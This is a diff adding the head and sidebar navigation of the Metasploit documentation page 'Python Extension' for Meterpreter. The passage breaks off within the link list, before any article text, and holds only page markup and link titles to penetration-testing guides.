@@ -1,0 +1,521 @@
+<!DOCTYPE html><html lang="en-US"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><link rel="shortcut icon" href="/assets/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/assets/css/just-the-docs-default.css"> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-4622520-7"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-4622520-7', { 'anonymize_ip': true }); </script> <script type="text/javascript" src="/assets/js/vendor/lunr.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mermaid@10.8.0/dist/mermaid.min.js"></script> <script type="text/javascript" src="/assets/js/just-the-docs.js"></script><meta name="viewport" content="width=device-width, initial-scale=1"><title>Python Extension | Metasploit Documentation Penetration Testing Software, Pen Testing Security</title><meta name="generator" content="Jekyll v4.3.1" /><meta property="og:title" content="Python Extension" /><meta property="og:locale" content="en_US" /><meta name="description" content="View Metasploit Framework Documentation" /><meta property="og:description" content="View Metasploit Framework Documentation" /><link rel="canonical" href="https://rapid7.github.io/metasploit-framework/docs/using-metasploit/advanced/meterpreter/python-extension.html" /><meta property="og:url" content="https://rapid7.github.io/metasploit-framework/docs/using-metasploit/advanced/meterpreter/python-extension.html" /><meta property="og:site_name" content="Metasploit Documentation Penetration Testing Software, Pen Testing Security" /><meta property="og:type" content="website" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Python Extension" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"WebPage","description":"View Metasploit Framework Documentation","headline":"Python Extension","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://rapid7.github.io/metasploit-framework/assets/images/favicon.png"}},"url":"https://rapid7.github.io/metasploit-framework/docs/using-metasploit/advanced/meterpreter/python-extension.html"}</script><body> <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <symbol id="svg-link" viewBox="0 0 24 24"><title>Link</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path> </svg> </symbol> <symbol id="svg-search" viewBox="0 0 24 24"><title>Search</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"> <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line> </svg> </symbol> <symbol id="svg-menu" viewBox="0 0 24 24"><title>Menu</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line> </svg> </symbol> <symbol id="svg-arrow-right" viewBox="0 0 24 24"><title>Expand</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right"><polyline points="9 18 15 12 9 6"></polyline> </svg> </symbol> <symbol id="svg-doc" viewBox="0 0 24 24"><title>Document</title><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline> </svg> </symbol> </svg> <script type="text/javascript" src="/assets/js/toggle_init.js"></script><div class="side-bar"><div class="site-header"> <a href="/" class="site-title lh-tight">Metasploit Documentation </a> <a href="#" id="menu-button" class="site-button"> <svg viewBox="0 0 24 24" class="icon"><use xlink:href="#svg-menu"></use></svg> </a></div><nav role="navigation" aria-label="Main" id="site-nav" class="site-nav"><ul class="nav-list"><li class="nav-list-item active"><a href="/" class="nav-list-link">Home</a><li class="nav-list-item active"><a href="/docs/code-of-conduct.html" class="nav-list-link">Code Of Conduct</a><li class="nav-list-item active"><a href="/docs/modules.html" class="nav-list-link">Modules</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/" class="nav-list-link">Pentesting</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-setting-module-options.html" class="nav-list-link">Setting Module Options</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-upgrading-shells-to-meterpreter.html" class="nav-list-link">Upgrading Shells to Meterpreter</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-post-gather-modules.html" class="nav-list-link">Post Gather Modules</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-http.html" class="nav-list-link">HTTP + HTTPS</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-kubernetes.html" class="nav-list-link">Kubernetes</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-mysql.html" class="nav-list-link">MySQL</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-postgresql.html" class="nav-list-link">PostgreSQL</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-smb.html" class="nav-list-link">SMB</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-ssh.html" class="nav-list-link">SSH</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-winrm.html" class="nav-list-link">WinRM</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-mssql.html" class="nav-list-link">MSSQL</a><li class="nav-list-item active"><a href="/docs/pentesting/metasploit-guide-ldap.html" class="nav-list-link">LDAP</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/active-directory/" class="nav-list-link">Active Directory</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/active-directory/ad-certificates/" class="nav-list-link">AD CS</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/overview.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/attacking-ad-cs-esc-vulnerabilities.html" class="nav-list-link">Attacking AD CS ESC Vulnerabilities Using Metasploit</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/ldap_esc_vulnerable_cert_finder.html" class="nav-list-link">Vulnerable cert finder</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/ad_cs_cert_template.html" class="nav-list-link">Manage certificate templates</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/ad-certificates/icpr_cert.html" class="nav-list-link">Request certificates</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/pentesting/active-directory/kerberos/" class="nav-list-link">Kerberos</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/overview.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/service_authentication.html" class="nav-list-link">Authenticating to SMB/WinRM/etc</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/kerberos_login.html" class="nav-list-link">Kerberos login enumeration and bruteforcing</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/get_ticket.html" class="nav-list-link">Get Ticket granting tickets and service tickets</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/ticket_converter.html" class="nav-list-link">Converting kirbi and ccache files</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/forge_ticket.html" class="nav-list-link">Forging tickets</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/inspect_ticket.html" class="nav-list-link">Inspecting tickets</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/kerberoasting.html" class="nav-list-link">Kerberoasting</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/keytab.html" class="nav-list-link">Keytab support and decrypting wireshark traffic</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/rbcd.html" class="nav-list-link">Resource-based constrained delegation (RBCD)</a><li class="nav-list-item active"><a href="/docs/pentesting/active-directory/kerberos/unconstrained_delegation.html" class="nav-list-link">Unconstrained delegation</a></ul></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/" class="nav-list-link active">Using Metasploit</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/getting-started/" class="nav-list-link">Getting Started</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/getting-started/nightly-installers.html" class="nav-list-link">Nightly Installers</a><li class="nav-list-item active"><a href="/docs/using-metasploit/getting-started/reporting-a-bug.html" class="nav-list-link">Reporting a Bug</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/basics/" class="nav-list-link">Basics</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/using-metasploit.html" class="nav-list-link">Running modules</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-to-use-a-metasploit-module-appropriately.html" class="nav-list-link">How to use a Metasploit module appropriately</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-payloads-work.html" class="nav-list-link">How payloads work</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/module-documentation.html" class="nav-list-link">Module Documentation</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html" class="nav-list-link">How to use a reverse shell in Metasploit</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/how-to-use-msfvenom.html" class="nav-list-link">How to use msfvenom</a><li class="nav-list-item active"><a href="/docs/using-metasploit/basics/managing-sessions.html" class="nav-list-link">Managing Sessions</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/intermediate/" class="nav-list-link">Intermediate</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/metasploit-database-support.html" class="nav-list-link">Database Support</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/evading-anti-virus.html" class="nav-list-link">Evading Anti Virus</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/exploit-ranking.html" class="nav-list-link">Exploit Ranking</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/hashes-and-password-cracking.html" class="nav-list-link">Hashes and Password Cracking</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/how-to-use-plugins.html" class="nav-list-link">Metasploit Plugins</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/payload-uuid.html" class="nav-list-link">Payload UUID</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/pivoting-in-metasploit.html" class="nav-list-link">Pivoting in Metasploit</a><li class="nav-list-item active"><a href="/docs/using-metasploit/intermediate/running-private-modules.html" class="nav-list-link">Running Private Modules</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/advanced/" class="nav-list-link active">Advanced</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/how-to-configure-dns.html" class="nav-list-link">How to Configure DNS</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/metasploit-web-service.html" class="nav-list-link">Metasploit Web Service</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/advanced/meterpreter/" class="nav-list-link active">Meterpreter</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html" class="nav-list-link">Configuration</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/debugging-dead-meterpreter-sessions.html" class="nav-list-link">Debugging Dead Meterpreter Sessions</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-debugging-meterpreter-sessions.html" class="nav-list-link">Debugging Meterpreter Sessions</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-executebof-command.html" class="nav-list-link">ExecuteBof Command</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-http-communication.html" class="nav-list-link">HTTP Communication</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/how-to-get-started-with-writing-a-meterpreter-script.html" class="nav-list-link">How to get started with writing a Meterpreter script</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-paranoid-mode.html" class="nav-list-link">Paranoid Mode</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/powershell-extension.html" class="nav-list-link">Powershell Extension</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/python-extension.html" class="nav-list-link active">Python Extension</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-reg-command.html" class="nav-list-link">Reg Command</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-reliable-network-communication.html" class="nav-list-link">Reliable Network Communication</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-sleep-control.html" class="nav-list-link">Sleep Control</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html" class="nav-list-link">Stageless Mode</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/the-ins-and-outs-of-http-and-https-communications-in-meterpreter-and-metasploit-stagers.html" class="nav-list-link">The ins and outs of HTTP and HTTPS communications in Meterpreter and Metasploit Stagers</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-timeout-control.html" class="nav-list-link">Timeout Control</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html" class="nav-list-link">Transport Control</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-unicode-support.html" class="nav-list-link">Unicode Support</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/meterpreter/meterpreter-wishlist.html" class="nav-list-link">Wishlist</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/advanced/RPC/" class="nav-list-link">RPC</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/RPC/how-to-use-metasploit-json-rpc.html" class="nav-list-link">How to use Metasploit JSON RPC</a><li class="nav-list-item active"><a href="/docs/using-metasploit/advanced/RPC/how-to-use-metasploit-messagepack-rpc.html" class="nav-list-link">How to use Metasploit Messagepack RPC</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/other/" class="nav-list-link">Other</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/other/how-to-use-the-favorite-command.html" class="nav-list-link">How to use the Favorite command</a><li class="nav-list-item active"><a href="/docs/using-metasploit/other/information-about-unmet-browser-exploit-requirements.html" class="nav-list-link">Information About Unmet Browser Exploit Requirements</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/using-metasploit/other/oracle-support/" class="nav-list-link">Oracle Support</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/using-metasploit/other/oracle-support/how-to-get-oracle-support-working-with-kali-linux.html" class="nav-list-link">How to get Oracle Support working with Kali Linux</a><li class="nav-list-item active"><a href="/docs/using-metasploit/other/oracle-support/oracle-usage.html" class="nav-list-link">Oracle Usage</a></ul><li class="nav-list-item active"><a href="/docs/using-metasploit/other/why-cve-is-not-available.html" class="nav-list-link">Why CVE is not available</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/" class="nav-list-link">Development</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/get-started/" class="nav-list-link">Get Started</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/get-started/contributing-to-metasploit.html" class="nav-list-link">Contributing to Metasploit</a><li class="nav-list-item active"><a href="/docs/development/get-started/creating-your-first-pr.html" class="nav-list-link">Creating Your First PR</a><li class="nav-list-item active"><a href="/docs/development/get-started/setting-up-a-metasploit-development-environment.html" class="nav-list-link">Setting Up a Metasploit Development Environment</a><li class="nav-list-item active"><a href="/docs/development/get-started/sanitizing-pcaps.html" class="nav-list-link">Sanitizing PCAPs</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/get-started/git/" class="nav-list-link">Git</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/get-started/git/git-reference-sites.html" class="nav-list-link">Git Reference Sites</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/git-cheatsheet.html" class="nav-list-link">Git cheatsheet</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/keeping-in-sync-with-rapid7-master.html" class="nav-list-link">Keeping in sync with rapid7 master</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/remote-branch-pruning.html" class="nav-list-link">Remote Branch Pruning</a><li class="nav-list-item active"><a href="/docs/development/get-started/git/using-git.html" class="nav-list-link">Using Git</a></ul><li class="nav-list-item active"><a href="/docs/development/get-started/navigating-and-understanding-metasploits-codebase.html" class="nav-list-link">Navigating the codebase</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/" class="nav-list-link">Developing Modules</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/guides/" class="nav-list-link">Guides</a><ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/guides/scanners/" class="nav-list-link">Scanners</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/scanners/how-to-write-a-http-loginscanner-module.html" class="nav-list-link">Writing a HTTP LoginScanner</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/scanners/creating-metasploit-framework-loginscanners.html" class="nav-list-link">Writing an FTP LoginScanner</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-check-microsoft-patch-levels-for-your-exploit.html" class="nav-list-link">How to check Microsoft patch levels for your exploit</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-use-fetch-payloads.html" class="nav-list-link">How to use Fetch Payloads</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-use-command-stagers.html" class="nav-list-link">How to use command stagers</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-write-a-check-method.html" class="nav-list-link">How to write a check method</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-write-a-cmd-injection-module.html" class="nav-list-link">How to write a cmd injection module</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-write-a-browser-exploit-using-httpserver.html" class="nav-list-link">Writing a browser exploit</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-get-started-with-writing-a-post-module.html" class="nav-list-link">Writing a post module</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/how-to-get-started-with-writing-an-auxiliary-module.html" class="nav-list-link">Writing an auxiliary module</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/guides/get-started-writing-an-exploit.html" class="nav-list-link">Writing an exploit</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/module-metadata/" class="nav-list-link">Module metadata</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html" class="nav-list-link">Definition of Module Reliability Side Effects and Stability</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html" class="nav-list-link">How to use datastore options</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/module-metadata/module-reference-identifiers.html" class="nav-list-link">Module Reference Identifiers</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/external-modules/" class="nav-list-link">External Modules</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/external-modules/writing-external-metasploit-modules.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/external-modules/writing-external-golang-modules.html" class="nav-list-link">Writing GoLang Modules</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/external-modules/writing-external-python-modules.html" class="nav-list-link">Writing Python Modules</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/" class="nav-list-link">Libraries</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/api.html" class="nav-list-link">API</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-msf-auxiliary-authbrute-to-write-a-bruteforcer.html" class="nav-list-link">AuthBrute</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-cleanup-after-module-execution.html" class="nav-list-link">Cleanup</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/c/" class="nav-list-link">Compiling C</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html" class="nav-list-link">Overview</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-decode-base64-with-metasploit-framework-compiler.html" class="nav-list-link">Base64 Support</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-decrypt-rc4-with-metasploit-framework-compiler.html" class="nav-list-link">RC4 Support</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/c/how-to-xor-with-metasploit-framework-compiler.html" class="nav-list-link">XOR Support</a></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/deserialization/" class="nav-list-link">Deserialization</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/deserialization/dot-net-deserialization.html" class="nav-list-link">Dot Net Deserialization</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/deserialization/generating-ysoserial-java-serialized-objects.html" class="nav-list-link">Java Deserialization</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/handling-module-failures-with-fail_with.html" class="nav-list-link">Fail_with</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-fileformat-mixin-to-create-a-file-format-exploit.html" class="nav-list-link">Fileformat</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-git-mixin-to-write-an-exploit-module.html" class="nav-list-link">Git Mixin</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/http/" class="nav-list-link">HTTP</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-write-a-browser-exploit-using-browserexploitserver.html" class="nav-list-link">BrowserExploitServer</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-httpclient.html" class="nav-list-link">How to Send an HTTP Request Using HttpClient</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-parse-an-http-response.html" class="nav-list-link">How to parse an HTTP response</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-send-an-http-request-using-rex-proto-http-client.html" class="nav-list-link">How to send an HTTP request using Rex Proto Http Client</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/http/how-to-write-a-module-using-httpserver-and-httpclient.html" class="nav-list-link">How to write a module using HttpServer and HttpClient</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-log-in-metasploit.html" class="nav-list-link">Logging</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/obfuscation/" class="nav-list-link">Obfuscation</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html" class="nav-list-link">C Obfuscation</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/obfuscation/how-to-obfuscate-javascript-in-metasploit.html" class="nav-list-link">JavaScript Obfuscation</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-phpexe-to-exploit-an-arbitrary-file-upload-bug.html" class="nav-list-link">PhpExe</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-powershell-in-an-exploit.html" class="nav-list-link">Powershell</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-railgun-for-windows-post-exploitation.html" class="nav-list-link">Railgun</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/using-reflectivedll-injection.html" class="nav-list-link">ReflectiveDLL Injection</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-do-reporting-or-store-data-in-module-development.html" class="nav-list-link">Reporting and Storing Data</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-seh-mixin-to-exploit-an-exception-handler.html" class="nav-list-link">SEH Exploitation</a><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/developing-modules/libraries/smb_library/" class="nav-list-link">SMB Library</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/smb_library/guidelines-for-writing-modules-with-smb.html" class="nav-list-link">Guidelines for Writing Modules with SMB</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/smb_library/what-my-rex-proto-smb-error-means.html" class="nav-list-link">What my Rex Proto SMB Error means</a></ul><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/sql-injection-libraries.html" class="nav-list-link">SQL Injection</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-the-msf-exploit-remote-tcp-mixin.html" class="nav-list-link">TCP</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-use-wbemexec-for-a-write-privilege-attack-on-windows.html" class="nav-list-link">WbemExec</a><li class="nav-list-item active"><a href="/docs/development/developing-modules/libraries/how-to-zip-files-with-msf-util-exe-to_zip.html" class="nav-list-link">Zip</a></ul></ul><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/docs/development/google-summer-of-code/" class="nav-list-link">Google Summer of Code</a><ul class="nav-list"><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2017-mentor-organization-application.html" class="nav-list-link">2017 Mentor Organization Application</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2017-project-ideas.html" class="nav-list-link">2017 Project Ideas</a><li class="nav-list-item active"><a href="/docs/development/google-summer-of-code/gsoc-2017-student-proposal.html" class="nav-list-link">2017 Student Proposal</a><li class="nav-list-item active"><a 